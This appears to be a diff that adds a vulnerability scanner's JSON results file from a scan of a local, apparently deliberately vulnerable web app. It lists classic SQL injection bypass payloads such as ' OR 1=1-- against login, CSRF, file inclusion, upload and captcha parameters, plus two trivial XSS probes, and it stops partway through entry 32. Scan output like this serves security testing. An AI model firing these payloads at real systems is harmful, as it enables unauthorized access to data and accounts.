@@ -1,0 +1,3361 @@
+{
+  "target": "http://127.0.0.1:8080",
+  "scan_start": "2026-02-07 15:17:59",
+  "vulnerabilities": [
+    {
+      "id": 1,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/setup.php",
+      "parameter": "create_db",
+      "payload": "\"",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "create_db"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5442
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:18:10",
+        "unix_timestamp": 1770473890
+      }
+    },
+    {
+      "id": 2,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/setup.php",
+      "parameter": "create_db",
+      "payload": "'",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "create_db"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5442
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:18:12",
+        "unix_timestamp": 1770473892
+      }
+    },
+    {
+      "id": 3,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/brute/",
+      "parameter": "password",
+      "payload": "' or 1=1 --",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4332
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:18:52",
+        "unix_timestamp": 1770473932
+      }
+    },
+    {
+      "id": 4,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/brute/",
+      "parameter": "password",
+      "payload": "1 or 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4332
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:18:55",
+        "unix_timestamp": 1770473935
+      }
+    },
+    {
+      "id": 5,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/brute/",
+      "parameter": "password",
+      "payload": "1' or '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4332
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:18:56",
+        "unix_timestamp": 1770473936
+      }
+    },
+    {
+      "id": 6,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "parameter": "password_conf",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4278
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:09",
+        "unix_timestamp": 1770474129
+      }
+    },
+    {
+      "id": 7,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "parameter": "password_conf",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4278
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:10",
+        "unix_timestamp": 1770474130
+      }
+    },
+    {
+      "id": 8,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "parameter": "password_conf",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4278
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:10",
+        "unix_timestamp": 1770474130
+      }
+    },
+    {
+      "id": 9,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "parameter": "password_conf",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4278
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:12",
+        "unix_timestamp": 1770474132
+      }
+    },
+    {
+      "id": 10,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "parameter": "password_conf",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4278
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:14",
+        "unix_timestamp": 1770474134
+      }
+    },
+    {
+      "id": 11,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "parameter": "page",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "page"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 3253
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:34",
+        "unix_timestamp": 1770474154
+      }
+    },
+    {
+      "id": 12,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "parameter": "page",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "page"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 3253
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:34",
+        "unix_timestamp": 1770474154
+      }
+    },
+    {
+      "id": 13,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "parameter": "page",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "page"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 3253
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:35",
+        "unix_timestamp": 1770474155
+      }
+    },
+    {
+      "id": 14,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "parameter": "page",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "page"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 3253
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:36",
+        "unix_timestamp": 1770474156
+      }
+    },
+    {
+      "id": 15,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "parameter": "page",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "page"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 3253
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:38",
+        "unix_timestamp": 1770474158
+      }
+    },
+    {
+      "id": 16,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "parameter": "uploaded",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "uploaded"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4203
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:58",
+        "unix_timestamp": 1770474178
+      }
+    },
+    {
+      "id": 17,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "parameter": "uploaded",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "uploaded"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4203
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:22:58",
+        "unix_timestamp": 1770474178
+      }
+    },
+    {
+      "id": 18,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "parameter": "uploaded",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "uploaded"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4203
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:00",
+        "unix_timestamp": 1770474180
+      }
+    },
+    {
+      "id": 19,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "parameter": "uploaded",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "uploaded"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4203
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:01",
+        "unix_timestamp": 1770474181
+      }
+    },
+    {
+      "id": 20,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "parameter": "uploaded",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "uploaded"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4203
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:03",
+        "unix_timestamp": 1770474183
+      }
+    },
+    {
+      "id": 21,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_new"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:36",
+        "unix_timestamp": 1770474216
+      }
+    },
+    {
+      "id": 22,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_new"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:36",
+        "unix_timestamp": 1770474216
+      }
+    },
+    {
+      "id": 23,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_new"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:38",
+        "unix_timestamp": 1770474218
+      }
+    },
+    {
+      "id": 24,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_new"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:39",
+        "unix_timestamp": 1770474219
+      }
+    },
+    {
+      "id": 25,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_new"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:41",
+        "unix_timestamp": 1770474221
+      }
+    },
+    {
+      "id": 26,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_conf",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:50",
+        "unix_timestamp": 1770474230
+      }
+    },
+    {
+      "id": 27,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_conf",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:50",
+        "unix_timestamp": 1770474230
+      }
+    },
+    {
+      "id": 28,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_conf",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:52",
+        "unix_timestamp": 1770474232
+      }
+    },
+    {
+      "id": 29,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_conf",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:53",
+        "unix_timestamp": 1770474233
+      }
+    },
+    {
+      "id": 30,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_conf",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "password_conf"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4724
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:23:54",
+        "unix_timestamp": 1770474234
+      }
+    },
+    {
+      "id": 31,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "parameter": "id",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4617
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:04",
+        "unix_timestamp": 1770474244
+      }
+    },
+    {
+      "id": 32,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "parameter": "id",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
